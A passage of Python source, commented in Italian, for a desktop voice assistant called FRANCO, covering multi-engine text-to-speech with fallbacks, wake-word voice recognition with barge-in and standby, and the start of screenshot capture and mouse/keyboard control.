        # comandi) e un thread in background (es. monitor proattivo) chiamano
        # speak() nello stesso momento, le chiamate a load()/play() possono
        # accavallarsi e mandare in crash nativo SDL (senza traceback Python —
        # coerente con l'app che si chiude di colpo senza errore visibile).
        # Questo lock serializza un'intera chiamata a speak() alla volta.
        self._playback_lock = threading.Lock()
        self._xtts = XTTSService(self.state, self.logger)

        self._init_mixer()
        self._xtts.start_supervisor()
    
    def _init_mixer(self):
        """Initialize pygame mixer"""
        if not DEPENDENCIES_STATUS.get('pygame'):
            self.logger.warning("TTS", "Pygame non disponibile, TTS limitato")
            return
        
        try:
            pygame.mixer.pre_init(frequency=24000, size=-16, channels=1, buffer=1024)
            pygame.mixer.init()
            self._mixer_initialized = True
            self.logger.success("TTS", "Mixer audio inizializzato")
        except Exception as e:
            self.logger.error("TTS", f"Mixer init fallito: {e}")
    
    def _clean_text(self, text: str) -> str:
        """Clean text for TTS"""
        # Rimuovi code blocks
        text = re.sub(r"```[\s\S]*?```", " codice... ", text)
        text = re.sub(r"`([^`]+)`", r"\1", text)
        
        # Rimuovi markdown
        text = re.sub(r"[*#_\[\](){}<>|\\]", "", text)
        
        # Sostituisci URL
        text = re.sub(r"https?://\S+", "un link", text)
        
        # Sigle in lettere
        replacements = {
            "AI": "A I", "API": "A P I", "URL": "U R L",
            "CPU": "C P U", "RAM": "ram", "GPU": "G P U",
            "SSH": "S S H", "FTP": "F T P", "DNS": "D N S",
            "IP": "I P", "TCP": "T C P", "UDP": "U D P",
            "SSL": "S S L", "TLS": "T L S", "HTTP": "H T T P",
            "HTTPS": "H T T P S", "SQL": "es q l",
            "MD5": "M D 5", "SHA": "S H A",
            "OS": "O S", "PC": "P C", "GB": "giga byte",
            "MB": "mega byte", "KB": "kilo byte",
            "CVE": "C V E",
        }
        
        for old, new in replacements.items():
            text = re.sub(rf"\b{old}\b", new, text)
        
        # Whitespace
        text = re.sub(r"\s+", " ", text).strip()
        
        # Limit length
        if len(text) > 800:
            text = text[:797] + "..."
        
        return text
    
    def _adapt_to_mood(self, mood: MoodType) -> Tuple[str, str]:
        """Adapt voice parameters based on mood"""
        if mood == MoodType.URGENT:
            return "+20%", "+5Hz"
        if mood == MoodType.EXCITED:
            return "+15%", "+8Hz"
        if mood == MoodType.POSITIVE:
            return "+8%", "+3Hz"
        if mood == MoodType.STRESSED:
            return "+0%", "-5Hz"
        if mood == MoodType.CURIOUS:
            return "+5%", "+0Hz"
        return self.BASE_RATE, self.BASE_PITCH
    
    async def _generate_audio_bytes(self, text: str, voice: str,
                                    rate: str, pitch: str) -> Optional[bytes]:
        """Generate audio bytes from edge-tts"""
        if not DEPENDENCIES_STATUS.get('edge_tts') or not edge_tts:
            return None
        
        try:
            communicate = edge_tts.Communicate(text, voice, rate=rate, pitch=pitch)
            buf = bytearray()

            async def _collect():
                async for chunk in communicate.stream():
                    if self._stop_flag.is_set():
                        return
                    if chunk["type"] == "audio":
                        buf.extend(chunk["data"])

            # Senza timeout, una rete lenta o il servizio Edge TTS irraggiungibile
            # blocca questa coroutine per sempre: siccome speak() la esegue con
            # asyncio.run() in modo sincrono (bloccante) dal thread principale,
            # l'intera app si congela ("Not Responding") finche' non risponde.
            await asyncio.wait_for(_collect(), timeout=15)
            return bytes(buf)
        except asyncio.TimeoutError:
            self.logger.error("TTS", "Generazione audio scaduta (timeout 15s) — rete lenta o servizio TTS irraggiungibile")
            return None
        except Exception as e:
            self.logger.error("TTS", f"Generation error: {e}")
            return None
    
    def _get_openai_client(self):
        """Crea il client solo quando SDK e chiave sono disponibili."""
        if self._openai_client is not None:
            return self._openai_client
        if not DEPENDENCIES_STATUS.get('openai') or not OpenAI:
            return None
        if not os.getenv("OPENAI_API_KEY"):
            return None
        try:
            self._openai_client = OpenAI(timeout=15.0)
            return self._openai_client
        except Exception as e:
            self.logger.error("TTS", f"Client OpenAI non disponibile: {e}")
            return None

    def _generate_openai_audio_bytes(self, text: str, mood: MoodType) -> Optional[bytes]:
        """Genera MP3 con la voce OpenAI Onyx senza salvare la chiave nel codice."""
        client = self._get_openai_client()
        if not client:
            return None

        mood_instructions = {
            MoodType.URGENT: "Parla con urgenza, in modo chiaro e controllato.",
            MoodType.EXCITED: "Parla con entusiasmo misurato e naturale.",
            MoodType.POSITIVE: "Parla con un tono positivo e cordiale.",
            MoodType.STRESSED: "Parla lentamente, con tono calmo e rassicurante.",
            MoodType.CURIOUS: "Parla con tono interessato e naturale.",
        }
        instructions = (
            "Parla esclusivamente in italiano con voce maschile naturale, calda e professionale. "
            "Mantieni un ritmo conversazionale. "
            + mood_instructions.get(mood, "Parla con tono neutro e cordiale.")
        )
        try:
            with client.audio.speech.with_streaming_response.create(
                model="gpt-4o-mini-tts",
                voice="onyx",
                input=text,
                instructions=instructions,
                response_format="mp3",
            ) as response:
                return response.read()
        except Exception as e:
            self.logger.error("TTS", f"OpenAI TTS non riuscito: {e}")
            return None

    def _generate_elevenlabs_audio_bytes(self, text: str, voice_id: str) -> Optional[bytes]:
        """Genera MP3 con una voce ElevenLabs. Chiave SOLO da variabile
        d'ambiente ELEVENLABS_API_KEY (mai hardcodata)."""
        api_key = os.environ.get("ELEVENLABS_API_KEY", "").strip()
        if not api_key:
            return None
        try:
            resp = requests.post(
                f"https://api.elevenlabs.io/v1/text-to-speech/{voice_id}",
                headers={
                    "xi-api-key": api_key,
                    "Content-Type": "application/json",
                    "Accept": "audio/mpeg",
                },
                json={
                    "text": text,
                    "model_id": "eleven_multilingual_v2",
                    "voice_settings": {"stability": 0.5, "similarity_boost": 0.75},
                },
                timeout=20,  # senza timeout, una rete lenta blocca speak() (thread voce/UI) per sempre
            )
            if resp.status_code != 200:
                self.logger.error(
                    "TTS", f"ElevenLabs TTS non riuscito: {resp.status_code} - {resp.text[:200]}"
                )
                return None
            return resp.content
        except Exception as e:
            self.logger.error("TTS", f"ElevenLabs TTS errore: {e}")
            return None

    def _generate_xtts_audio_bytes(self, text: str) -> Optional[bytes]:
        """Genera WAV con XTTS v2 locale (server su E:\\FRANCO\\xtts_env,
        franco_xtts_server.py) — gratuito e offline, nessuna quota. Se il
        server non e' in ascolto (non avviato, o ancora in caricamento
        modello) ritorna None e speak() ripiega su Diego."""
        try:
            return self._xtts.synthesize(text, self._stop_flag)
        except InterruptedError:
            return None
        except Exception as e:
            self.state.set("tts_status", "error")
            self.state.set("tts_error", str(e))
            self.logger.error("TTS", f"XTTS errore: {e}")
            return None

    def speak(self, text: str, mood: MoodType = None, blocking: bool = True):
        """Speak text via TTS"""
        if not text or not text.strip():
            return
        if self.state.get("speech_muted", False):
            self.logger.info("TTS", "Voce Franco disattivata: risposta disponibile solo in testo")
            return
        
        if not self._mixer_initialized:
            print(f"[FRANCO]: {text}")
            self.logger.info("FRANCO", text)
            return
        
        # Un'intera chiamata a speak() e' serializzata: pygame.mixer.music non
        # e' thread-safe, e senza questo lock una seconda speak() (es. da un
        # thread di monitoraggio in background) puo' accavallarsi a questa e
        # mandare in crash il processo a livello nativo.
        with self._playback_lock:
            self._stop_flag.clear()
            self.state.set("speaking", True)
            self.state.set("interrupted", False)

            # Determina mood
            if mood is None:
                mood_val = self.state.get("mood", MoodType.NEUTRAL)
                mood = mood_val if isinstance(mood_val, MoodType) else MoodType.NEUTRAL

            cleaned_text = self._clean_text(text)
            rate, pitch = self._adapt_to_mood(mood)
            voice_name = TTS_VOICES.get(self._current_voice, TTS_VOICES["diego"])

            self.logger.info("FRANCO", text[:100])

            try:
                # ElevenLabs e' la voce preferita. Se manca la chiave o la
                # generazione fallisce, Edge-TTS (Diego) continua a
                # funzionare senza interrompere FRANCO.
                audio_ext = "mp3"  # Edge-TTS/ElevenLabs/OpenAI = mp3; XTTS = wav (vedi sotto)
                if self._current_voice == "elevenlabs":
                    audio_bytes = self._generate_elevenlabs_audio_bytes(cleaned_text, ELEVENLABS_VOICE_ID)
                    if not audio_bytes:
                        self.logger.warning(
                            "TTS",
                            "ElevenLabs TTS non disponibile: uso Diego (Edge-TTS) come fallback"
                        )
                        audio_bytes = asyncio.run(
                            self._generate_audio_bytes(cleaned_text, TTS_VOICES["diego"], rate, pitch)
                        )
                elif self._current_voice == "onyx":
                    audio_bytes = self._generate_openai_audio_bytes(cleaned_text, mood)
                    if not audio_bytes:
                        self.logger.warning(
                            "TTS",
                            "OpenAI TTS non disponibile: uso Diego (Edge-TTS) come fallback"
                        )
                        audio_bytes = asyncio.run(
                            self._generate_audio_bytes(cleaned_text, TTS_VOICES["diego"], rate, pitch)
                        )
                elif self._current_voice == "xtts":
                    audio_bytes = self._generate_xtts_audio_bytes(cleaned_text)
                    if audio_bytes:
                        audio_ext = "wav"
                    else:
                        self.logger.warning(
                            "TTS",
                            "XTTS locale non disponibile: uso Diego (Edge-TTS) come fallback"
                        )
                        audio_bytes = asyncio.run(
                            self._generate_audio_bytes(cleaned_text, TTS_VOICES["diego"], rate, pitch)
                        )
                else:
                    audio_bytes = asyncio.run(
                        self._generate_audio_bytes(cleaned_text, voice_name, rate, pitch)
                    )

                if not audio_bytes or self._stop_flag.is_set():
                    return

                envelope = wav_envelope(audio_bytes) if audio_ext == "wav" else []

                # Scrivi file temporaneo
                with self._lock:
                    self._current_file = str(AUDIO_DIR / f"tts_{uuid.uuid4().hex[:10]}.{audio_ext}")
                    with open(self._current_file, "wb") as f:
                        f.write(audio_bytes)

                # Riproduci
                if not pygame.mixer.get_init():
                    try:
                        pygame.mixer.init(frequency=24000, size=-16, channels=1, buffer=1024)
                    except Exception as e:
                        self.logger.error("TTS", f"Mixer reinit fallito: {e}")
                        print(f"[FRANCO]: {text}")
                        return

                pygame.mixer.music.load(self._current_file)
                pygame.mixer.music.set_volume(self.state.get("volume", 0.9))
                pygame.mixer.music.play()

                # Attendi se blocking
                if blocking:
                    # Tetto massimo di sicurezza: se pygame resta bloccato in
                    # get_busy()==True (es. driver audio in stato inconsistente),
                    # senza questo limite il ciclo gira all'infinito e congela
                    # FRANCO (girava sullo stesso thread di voce/UI). Stima la
                    # durata attesa dall'audio generato e aggiunge un margine.
                    max_wait = max(10.0, len(audio_bytes) / 4000.0)
                    waited = 0.0
                    while pygame.mixer.music.get_busy():
                        if envelope:
                            self.state.set("tts_level", envelope[min(len(envelope) - 1, int(waited / 0.04))], notify=False)
                        if self._stop_flag.is_set():
                            pygame.mixer.music.stop()
                            break
                        if waited >= max_wait:
                            self.logger.warning(
                                "TTS",
                                f"get_busy() bloccato oltre {max_wait:.0f}s — reinizializzo il "
                                f"mixer audio (possibile problema driver audio)"
                            )
                            # Un semplice .stop() su un mixer gia' in stato
                            # inconsistente puo' non bastare (o, su alcuni driver,
                            # far crashare a livello nativo SDL senza traceback
                            # Python — coerente con chiusure improvvise senza
                            # errore visibile). Un quit()+init() completo forza
                            # un reset pulito del device audio.
                            try:
                                pygame.mixer.music.stop()
                            except Exception:
                                pass
                            try:
                                pygame.mixer.quit()
                                pygame.mixer.init(frequency=24000, size=-16, channels=1, buffer=1024)
                            except Exception as e2:
                                self.logger.error("TTS", f"Reinit mixer fallito: {e2}")
                            break
                        time.sleep(0.03)
                        waited += 0.03

            except Exception as e:
                self.logger.exception("TTS", "Errore TTS", e)
            finally:
                try:
                    pygame.mixer.music.unload()
                except Exception as _e:
                    pass  # suppressed error

                time.sleep(0.05)

                # Cleanup file temporaneo
                with self._lock:
                    if self._current_file and os.path.exists(self._current_file):
                        try:
                            os.remove(self._current_file)
                        except Exception as _e:
                            pass  # suppressed error
                    self._current_file = None

                self.state.set("speaking", False)
                self.state.set("tts_level", 0.0, notify=False)
                if self.state.get("tts_status") != "error":
                    self.state.set("tts_status", "ready", notify=False)
    
    def interrupt(self):
        """Interrupt current TTS"""
        self._stop_flag.set()
        try:
            if self._mixer_initialized:
                pygame.mixer.music.stop()
                pygame.mixer.music.unload()
        except Exception as _e:
            pass  # suppressed error
        
        self.state.set("speaking", False)
        self.state.set("interrupted", True)
        self.logger.debug("FRANCO", "TTS interrotto")
    
    def change_voice(self, voice_name: str) -> str:
        """Change current voice"""
        voice_lower = voice_name.lower()
        _SPECIAL_ENGINES = ("elevenlabs", "onyx", "xtts")
        if voice_lower in TTS_VOICES or voice_lower in _SPECIAL_ENGINES:
            self._current_voice = voice_lower
            return f"Voce cambiata in {voice_lower}."
        available = ", ".join(list(TTS_VOICES.keys()) + list(_SPECIAL_ENGINES))
        return f"Voce '{voice_name}' non disponibile. Disponibili: {available}"
    
    def cleanup_temp_files(self):
        """Clean temp audio files"""
        self._xtts.stop_supervisor()
        for f in AUDIO_DIR.glob("tts_*.mp3"):
            try:
                f.unlink()
            except Exception as _e:
                pass  # suppressed error


# ==============================================================================
# VAD — VOICE ACTIVITY DETECTION & RECOGNITION
# ==============================================================================

class VoiceRecognizer:
    """
    Voice Activity Detection con:
    - Wake word detection
    - Continuous listening
    - TTS interruption on speech
    - Mood inference from audio
    - Adaptive noise floor
    """
    
    CHUNK = 1024
    CHANNELS = 1
    RATE = 16000
    
    def __init__(self, logger: StructuredLogger, state: StateManager,
                 event_bus: EventBus, command_queue: queue.Queue,
                 voice_synth: VoiceSynthesizer):
        self.logger = logger
        self.state = state
        self.event_bus = event_bus
        self.command_queue = command_queue
        self.voice_synth = voice_synth
        self._running = False
        self._transcript_buffer = deque(maxlen=40)
        
        if not DEPENDENCIES_STATUS.get('speech_recognition'):
            self.logger.warning("VAD", "speech_recognition non disponibile")
            self.recognizer = None
            return
        
        self.recognizer = sr.Recognizer()
        self.recognizer.energy_threshold = 250
        self.recognizer.dynamic_energy_threshold = True
        self.recognizer.pause_threshold = 0.8
        
        self._ambient_rms = 100.0
        self._barge_voice_frames = 0
        self._last_barge_in = 0.0
        self._restart_requested = False
        self._stream = None
        self._device_index = None
        self._partial_busy = False
        self._last_partial_at = 0.0
        self._format = pyaudio.paInt16 if DEPENDENCIES_STATUS.get('pyaudio') else None
    def get_transcript_buffer(self) -> deque:
        return self._transcript_buffer

    def _input_devices(self, p: "pyaudio.PyAudio") -> list:
        devices = []
        try:
            for index in range(p.get_device_count()):
                info = p.get_device_info_by_index(index)
                if info.get("maxInputChannels", 0) > 0:
                    devices.append({"index": index, "name": str(info.get("name", f"Input {index}"))})
        except Exception as error:
            self.logger.warning("VAD", f"Elenco microfoni non disponibile: {error}")
        return devices

    def cycle_input_device(self) -> str:
        devices = self.state.get("mic_devices", []) or []
        if not devices:
            return "Nessun microfono disponibile. Premi Riprova."
        current = self.state.get("mic_device_index")
        position = next((i for i, item in enumerate(devices) if item.get("index") == current), -1)
        selected = devices[(position + 1) % len(devices)]
        self.state.set("mic_requested_index", selected["index"], notify=False)
        self._restart_requested = True
        return f"Seleziono {selected['name']}."

    def retry_microphone(self) -> str:
        self.state.set("mic_error", "", notify=False)
        self._restart_requested = True
        if not self._running and self.state.get("running"):
            threading.Thread(target=self.start_listening, daemon=True,
                             name="VoiceListenerRetry").start()
        return "Riprovo ad aprire il microfono."

    def stop(self):
        self._running = False
        self._restart_requested = False
        stream = self._stream
        if stream is not None:
            try:
                stream.stop_stream(); stream.close()
            except Exception:
                pass
    
    def _calculate_rms(self, data: bytes) -> float:
        """Calculate RMS from audio data"""
        try:
            count = len(data) // 2
            if count == 0:
                return 0
            shorts = struct.unpack(f"{count}h", data)
            sum_sq = sum(s * s for s in shorts)
            rms = math.sqrt(sum_sq / count) if count else 0
            
            # Update mic level in state (normalized 0-1)
            self.state.set("mic_level", min(1.0, rms / 2000), notify=False)
            
            return rms
        except Exception:
            return 0

    def _looks_like_speech(self, data: bytes, rms: float) -> bool:
        """Scarta colpi brevi e rumore impulsivo prima del barge-in.

        La voce tende ad avere energia distribuita, un numero moderato di
        attraversamenti dello zero e un picco meno estremo di un battito.
        """
        try:
            samples = struct.unpack(f"{len(data) // 2}h", data)
            if len(samples) < 64 or rms < max(180.0, self._ambient_rms * 1.7):
                return False
            crossings = sum(1 for a, b in zip(samples, samples[1:]) if (a < 0) != (b < 0))
            zcr = crossings / max(1, len(samples) - 1)
            crest = max(abs(v) for v in samples) / max(1.0, rms)
            return 0.018 <= zcr <= 0.38 and crest <= 7.0
        except (ValueError, struct.error):
            return False
        
    def _bytes_to_audiodata(self, raw_bytes: bytes):
        """Convert raw bytes to AudioData for recognizer"""
        wav_buf = io.BytesIO()
        with wave.open(wav_buf, "wb") as wf:
            wf.setnchannels(self.CHANNELS)
            wf.setsampwidth(2)  # fisso a 2 bytes (16-bit), non usare pyaudio.paInt16
            wf.setframerate(self.RATE)
            wf.writeframes(raw_bytes)
        wav_buf.seek(0)

        with sr.AudioFile(wav_buf) as src:
            return self.recognizer.record(src)

    def _find_input_device(self, p: "pyaudio.PyAudio", name_hint: str) -> Optional[int]:
        """Cerca tra i dispositivi di input audio uno il cui nome contiene
        name_hint (case-insensitive) — es. le cuffie Bluetooth Sony WF-*.
        Ritorna l'indice del dispositivo, o None se non trovato (si userà il
        default di sistema)."""
        hint = name_hint.lower().strip()
        if not hint:
            return None
        try:
            for i in range(p.get_device_count()):
                info = p.get_device_info_by_index(i)
                if info.get("maxInputChannels", 0) > 0 and hint in str(info.get("name", "")).lower():
                    self.logger.success("VAD", f"Microfono selezionato: {info.get('name')} (indice {i})")
                    return i
        except Exception as e:
            self.logger.warning("VAD", f"Enumerazione microfoni fallita: {e}")
        return None

    def start_listening(self):
        """Continuous capture with device recovery and tolerant endpointing."""
        self._running = True

        if not DEPENDENCIES_STATUS.get('pyaudio') or not pyaudio:
            self.state.set("mic_status", "error", notify=False)
            self.state.set("mic_error", "PyAudio non disponibile. Avvia FRANCO con avvia_franco.bat.", notify=False)
            self.logger.warning("VAD", "PyAudio non disponibile nel runtime")
            self._running = False
            return

        p = None
        try:
            p = pyaudio.PyAudio()
            devices = self._input_devices(p)
            self.state.set("mic_devices", devices, notify=False)
            # Nessuna preferenza di default: usa il microfono predefinito di
            # Windows. Imposta FRANCO_MIC_NAME_HINT (es. "wf" per cuffie
            # Bluetooth Sony WF-*) solo se vuoi che FRANCO cerchi un
            # dispositivo specifico invece di quello di sistema.
            mic_hint = os.environ.get("FRANCO_MIC_NAME_HINT", "").strip()
            requested = self.state.get("mic_requested_index")
            env_index = os.environ.get("FRANCO_MIC_DEVICE_INDEX", "").strip()
            if env_index.isdigit():
                requested = int(env_index)
            device_index = (requested if isinstance(requested, int)
                            else self._find_input_device(p, mic_hint) if mic_hint else None)
            if mic_hint and device_index is None:
                self.logger.warning("VAD", f"Nessun microfono con '{mic_hint}' nel nome trovato, uso il dispositivo di default.")
            stream = p.open(
                format=self._format,
                channels=self.CHANNELS,
                rate=self.RATE,
                input=True,
                input_device_index=device_index,
                frames_per_buffer=self.CHUNK
            )
            self._stream = stream
            info = (p.get_device_info_by_index(device_index) if device_index is not None
                    else p.get_default_input_device_info())
            self._device_index = int(info.get("index", device_index or 0))
            self.state.set("mic_device_index", self._device_index, notify=False)
            self.state.set("mic_device_name", str(info.get("name", "Microfono")), notify=False)
            self.state.set("mic_status", "calibrating", notify=False)
            self.state.set("mic_error", "", notify=False)
        except Exception as e:
            self.logger.error("VAD", f"Mic init failed: {e}")
            self.state.set("mic_status", "error", notify=False)
            self.state.set("mic_error", "Microfono non accessibile. Controlla Privacy e sicurezza > Microfono, poi premi Riprova. Dettaglio: " + str(e), notify=False)
            if p is not None:
                try: p.terminate()
                except Exception: pass
            self._running = False
            return
        
        self.logger.success("VAD", f"Ascolto attivo: {self.state.get('mic_device_name')}")
        
        # Calibrazione ambient
        self._calibrate_ambient(stream)
        self.state.set("mic_status", "ready", notify=False)
        voice_threshold = max(90.0, self._ambient_rms * VAD_ENERGY_MULTIPLIER)
        
        speech_buffer = b""
        last_voice_t = None
        in_speech = False
        speech_start_t = None
        read_errors = 0
        
        while self._running and self.state.get("running") and not self._restart_requested:
            try:
                raw = stream.read(self.CHUNK, exception_on_overflow=False)
                read_errors = 0
            except Exception as error:
                read_errors += 1
                if read_errors >= 8:
                    self.state.set("mic_status", "error", notify=False)
                    self.state.set("mic_error", "Il flusso del microfono si è interrotto: " + str(error), notify=False)
                    break
                time.sleep(0.1)
                continue

            if not self.state.get("voice_enabled", True):
                self.state.set("mic_level", 0.0, notify=False)
                self.state.set("mic_status", "muted", notify=False)
                speech_buffer, last_voice_t, in_speech, speech_start_t = b"", None, False, None
                time.sleep(0.04)
                continue
            if self.state.get("mic_status") == "muted":
                self.state.set("mic_status", "ready", notify=False)
            
            rms = self._calculate_rms(raw)
            now = time.time()
            is_voice = rms > voice_threshold * (0.62 if in_speech else 1.0)

            # Barge-in: richiede più frame consecutivi compatibili con voce.
            # Un colpo o un tocco produce un picco breve e non supera il debounce.
            if self.state.get("speaking"):
                if is_voice and self._looks_like_speech(raw, rms):
                    self._barge_voice_frames += 1
                else:
                    self._barge_voice_frames = max(0, self._barge_voice_frames - 2)
                required = max(5, int(0.45 * self.RATE / self.CHUNK))
                if (self._barge_voice_frames >= required
                        and now - self._last_barge_in >= 1.2):
                    self._last_barge_in = now
                    self._barge_voice_frames = 0
                    self.voice_synth.interrupt()
                    self.state.set("active", True)
                    self.event_bus.emit("turn.cancel_requested", data={}, source="VoiceRecognizer")
                continue
            self._barge_voice_frames = 0
            
            if is_voice:
                if not in_speech:
                    in_speech = True
                    speech_start_t = now
                    speech_buffer = raw
                else:
                    speech_buffer += raw
                if now - self._last_partial_at >= 1.4 and len(speech_buffer) >= self.RATE * 2:
                    self._schedule_partial(speech_buffer)
                last_voice_t = now
                self.state.set("voice_capture", {"active": True, "status": "listening",
                               "elapsed": round(now - speech_start_t, 1), "silence": 0.0}, notify=False)
            elif in_speech and last_voice_t:
                silence = now - last_voice_t
                duration = now - speech_start_t
                self.state.set("voice_capture", {"active": True, "status": "hangover",
                               "elapsed": round(duration, 1), "silence": round(silence, 1)}, notify=False)
                if silence >= VAD_SILENCE_THRESHOLD or duration >= VAD_MAX_PHRASE_DURATION:
                    if last_voice_t - speech_start_t >= VAD_MIN_SPEECH_DURATION:
                        self.state.set("mic_status", "transcribing", notify=False)
                        self._transcribe(speech_buffer)
                    
                    in_speech = False
                    speech_buffer = b""
                    last_voice_t = None
                    speech_start_t = None
                    self.state.set("voice_capture", {"active": False}, notify=False)
                    self.state.set("mic_status", "ready", notify=False)
                else:
                    speech_buffer += raw
        
        try:
            stream.stop_stream()
            stream.close()
            p.terminate()
        except Exception as _e:
            pass  # suppressed error
        self._stream = None
        restart = self._restart_requested and self.state.get("running")
        self._restart_requested = False
        if restart:
            threading.Thread(target=self.start_listening, daemon=True,
                             name="VoiceListenerSwitch").start()
    
    def _calibrate_ambient(self, stream):
        """Calibrate ambient noise level"""
        try:
            samples = []
            for _ in range(30):
                raw = stream.read(self.CHUNK, exception_on_overflow=False)
                samples.append(self._calculate_rms(raw))
            
            self._ambient_rms = sum(samples) / len(samples) if samples else 100
            self.state.set("noise_floor", self._ambient_rms)
            self.logger.info("VAD", f"Ambient noise calibrated: {self._ambient_rms:.1f}")
        except Exception as e:
            self.logger.warning("VAD", f"Calibration failed: {e}")
    
    def _transcribe(self, raw_bytes: bytes):
        """Transcribe audio bytes"""
        try:
            audio_data = self._bytes_to_audiodata(raw_bytes)
            text = self.recognizer.recognize_google(audio_data, language="it-IT")
            
            if not text.strip():
                return
            
            self.logger.info("SENTITO", text)
            self._transcript_buffer.append(("UTENTE", text, datetime.now()))
            
            # Mood analysis
            mood = MoodDetector.analyze_text(text)
            self.state.set("mood", mood)
            
            # Emit event
            self.event_bus.emit("voice.transcribed",
                              data={"text": text, "mood": mood.value},
                              source="VoiceRecognizer")
            
            # Handle input
            self._handle_input(text)
        
        except sr.UnknownValueError:
            pass
        except sr.RequestError as e:
            self.logger.warning("SPEECH", f"Errore servizio: {e}")
            self.state.set("mic_error", "Trascrizione non raggiungibile: " + str(e), notify=False)
        except Exception as e:
            self.logger.exception("VAD", "Transcribe error", e)
        finally:
            if self.state.get("voice_enabled", True):
                self.state.set("mic_status", "ready", notify=False)

    def _schedule_partial(self, raw_bytes: bytes):
        """Transcribe a snapshot for UI/speculation only; never executes it."""
        if self._partial_busy:
            return
        self._partial_busy, self._last_partial_at = True, time.time()
        snapshot = bytes(raw_bytes)
        def work():
            try:
                text = self.recognizer.recognize_google(
                    self._bytes_to_audiodata(snapshot), language="it-IT").strip()
                if text:
                    self.state.set("partial_transcript", text, notify=False)
                    self.event_bus.emit("voice.partial", data={"text": text, "final": False},
                                        source="VoiceRecognizer")
            except Exception:
                pass
            finally:
                self._partial_busy = False
        threading.Thread(target=work, daemon=True, name="PartialASR").start()
    
    def _extract_command(self, text: str) -> str:
        """Rimuove la wake word dal testo e restituisce il comando puro."""
        t = text.lower()
        for wake in sorted(WAKE_WORDS, key=len, reverse=True):
            if t.startswith(wake):
                return text[len(wake):].strip()
            if wake in t:
                idx = t.index(wake)
                return text[idx + len(wake):].strip()
        return ""

    _STANDBY_WORDS = ("standby", "riposati", "dormi", "vai in pausa", "pausa",
                      "disattiva", "silenzio", "stai zitto")

    def _touch_conversation(self):
        """Apre/rinnova la finestra di conversazione: per i prossimi
        CONVERSATION_FOLLOWUP_WINDOW secondi i comandi NON richiedono di
        ripetere 'ehi Franco'."""
        self.state.set("conversation_until",
                       time.time() + CONVERSATION_FOLLOWUP_WINDOW, notify=False)

    def _enter_standby(self):
        self.state.set("active", False)
        self.state.set("standby", True)
        self.state.set("conversation_until", 0.0, notify=False)

    def _dispatch(self, cmd: str):
        """Accoda il comando (o il wake puro) e rinnova la finestra di follow-up."""
        self.command_queue.put(cmd if cmd else "__WAKE__")
        self._touch_conversation()

    def _handle_input(self, text: str):
        t = text.lower()
        has_wake = any(w in t for w in WAKE_WORDS)

        # ── STANDBY: BLOCCO ASSOLUTO ──────────────────────────────────────
        # Se in standby, ignora TUTTO tranne la wake word. Fine.
        if self.state.get("standby"):
            if has_wake:
                self.state.set("standby", False)
                self.state.set("active", True)
                self.state.set("system_state", SystemState.IDLE)
                self.event_bus.emit("voice.wake", source="VoiceRecognizer")
                self._dispatch(self._extract_command(text))
            return

        # ── FUORI STANDBY ────────────────────────────────────────────────
        # Un comando è valido se:
        #   (a) contiene la wake word, OPPURE
        #   (b) siamo ancora nella finestra di conversazione aperta dall'ultima
        #       interazione — così dopo "ehi Franco" (o dopo la sua risposta)
        #       puoi continuare a parlare SENZA ripetere la wake word.
        # Fuori dalla finestra e senza wake word l'audio è rumore di fondo: ignorato.
        in_window = time.time() < self.state.get("conversation_until", 0.0)
        if not has_wake and not in_window:
            # Sentito ma scartato: nessuna wake word e finestra di conversazione
            # chiusa. Lo logghiamo per rendere visibile il "sente ma non risponde".
            self.logger.info("VAD", f"Ignorato (nessuna wake word / fuori finestra): '{text}'")
            return

        # TTS in corso: interrompi e ascolta il nuovo comando
        if self.state.get("speaking"):
            self.voice_synth.interrupt()

        self.state.set("active", True)

        # Comando di standby (con o senza wake word, dentro la finestra)
        if any(x in t for x in self._STANDBY_WORDS):
            self._enter_standby()
            return

        # Con wake word -> rimuovi il prefisso; dentro la finestra -> tutto il testo
        cmd = self._extract_command(text) if has_wake else text.strip()
        self._dispatch(cmd)

# ==============================================================================
# SCREEN VISION
# ==============================================================================

class ScreenVision:
    """
    Computer vision per:
    - Screenshot capture
    - Screen analysis con Claude Vision
    - Element detection
    - Text extraction (OCR-like)
    """
    
    def __init__(self, logger: StructuredLogger, ai_client: ClaudeAIClient):
        self.logger = logger
        self.ai_client = ai_client
    
    def capture_screenshot(self, region: Tuple[int, int, int, int] = None) -> Tuple[Optional[bytes], Optional[str]]:
        """Capture screenshot, return PNG bytes and error if any"""
        if not DEPENDENCIES_STATUS.get('pillow'):
            return None, "Pillow non installato"
        
        try:
            if DEPENDENCIES_STATUS.get('pyautogui') and pyautogui:
                img = pyautogui.screenshot(region=region) if region else pyautogui.screenshot()
            elif ImageGrab:
                img = ImageGrab.grab(bbox=region) if region else ImageGrab.grab()
            else:
                return None, "Nessun tool screenshot disponibile"
            
            buf = io.BytesIO()
            img.save(buf, format="PNG", optimize=True)
            return buf.getvalue(), None
        except Exception as e:
            return None, str(e)
    
    def capture_base64(self, region: Tuple[int, int, int, int] = None) -> Tuple[Optional[str], Optional[str]]:
        """Capture screenshot as base64 string"""
        png_bytes, err = self.capture_screenshot(region)
        if err:
            return None, err
        b64 = base64.standard_b64encode(png_bytes).decode("utf-8")
        return b64, None
    
    # ------------------------------------------------------------------
    # CONTROLLO INPUT (mouse/tastiera) — usato per automazione e per
    # giocare al posto dell'utente (vedi CommandEngine._cmd_play_game)
    # ------------------------------------------------------------------

    def input_available(self) -> bool:
        return bool(DEPENDENCIES_STATUS.get('pyautogui') and pyautogui)

    def screen_size(self) -> Tuple[int, int]:
        if self.input_available():
            try:
                size = pyautogui.size()
                return int(size[0]), int(size[1])
            except Exception:
                pass
        return (1920, 1080)

    def click_at(self, x: int, y: int, button: str = "left", clicks: int = 1) -> Optional[str]:
        if not self.input_available():
            return "pyautogui non disponibile"
        try:
            pyautogui.click(x=int(x), y=int(y), clicks=clicks, button=button)
            return None
        except Exception as e:
            return str(e)

    def press_key(self, key: str) -> Optional[str]:
        """Preme un tasto singolo o una combinazione (es. 'ctrl+z')."""
        if not self.input_available():
            return "pyautogui non disponibile"
        try:
            parts = [p.strip() for p in str(key).lower().split("+") if p.strip()]
            if len(parts) > 1:
                pyautogui.hotkey(*parts)
            else:
                pyautogui.press(parts[0] if parts else str(key))
            return None
        except Exception as e:
            return str(e)

    def hold_key(self, key: str, duration: float = 0.3) -> Optional[str]:
        """Tiene premuto un tasto per `duration` secondi (utile per movimento nei giochi)."""
        if not self.input_available():
            return "pyautogui non disponibile"
        try:
            pyautogui.keyDown(key)
            time.sleep(max(0.05, min(duration, 5.0)))
            pyautogui.keyUp(key)
            return None
        except Exception as e:
            try:
